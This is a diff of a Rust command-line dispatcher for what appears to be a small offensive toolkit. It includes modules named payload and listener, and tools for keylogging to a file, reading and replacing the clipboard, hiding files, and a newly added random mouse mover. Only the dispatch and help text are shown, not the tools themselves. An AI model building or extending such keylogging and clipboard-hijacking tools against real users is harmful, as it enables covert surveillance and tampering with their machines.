@@ -1,7 +1,7 @@
 mod payload;
 mod listener;
 mod tools;
-use tools::{ghost, keylogger, clipboard, replaceboard, Tool};
+use tools::{ghost, keylogger, clipboard, replaceboard, mouseketool, Tool};
 use std::{
     error::Error,
 };
@@ -12,6 +12,7 @@ fn check_tool(input: &str) -> Tool {
         "clipboard" => return Tool::Clipboard,
         "replaceboard" => return Tool::ReplaceBoard,
         "ghost" => return Tool::Ghost,
+        "mouseketool" => return Tool::Mouseketool,
         _ => return Tool::Invalid, 
     }
 }
@@ -35,10 +36,12 @@ pub fn build(mut args: impl Iterator<Item = String>) -> Result<Tool, &'static st
                 }
             }
             "--list" => {
-                return Err("\n\nAvailable tools:
+                return Err("\n
+Available tools:
 - clipboard         Outputs the current clipboard
 - ghost             Changes files in the current directory to hidden
-- keylogger         Listens for keypresses for 10 seconds
+- keylogger         Listens for keypresses and outputs them to a log file
+- mouseketool       Moves mouse to a random position every so often
 - replaceboard      Replaces the clipboard text
 ");
 
@@ -47,7 +50,7 @@ pub fn build(mut args: impl Iterator<Item = String>) -> Result<Tool, &'static st
         }
     }
     
-    Err("\
+    Err("
 No tool specified. Use -t or --tool to specify a tool
 Use --list to see a list of available tools")
 }
@@ -55,27 +58,24 @@ Use --list to see a list of available tools")
 pub fn run(tool: Tool) -> Result<(), Box<dyn Error>> {
     match tool {
         Tool::Keylogger => {
-            // You can implement the logic for Keylogger here
             let _ = keylogger::run();
-            return Ok(());
         }
         Tool::Clipboard => {
-            // You can implement the logic for Clipboard here
             let _ = clipboard::run()?;
-            return Ok(());
         }
         Tool::ReplaceBoard => {
             let _ = replaceboard::run()?;
-            return Ok(());
-
         }
         Tool::Ghost => {
             let _ = ghost::run()?;
-            return Ok(())
         }
+        Tool::Mouseketool => {
+            mouseketool::run();
+        } 
         Tool::Invalid => {
             // Return an error if the tool is invalid
             return Err("Invalid tool".into());
         }
     }
+    Ok(())
 }
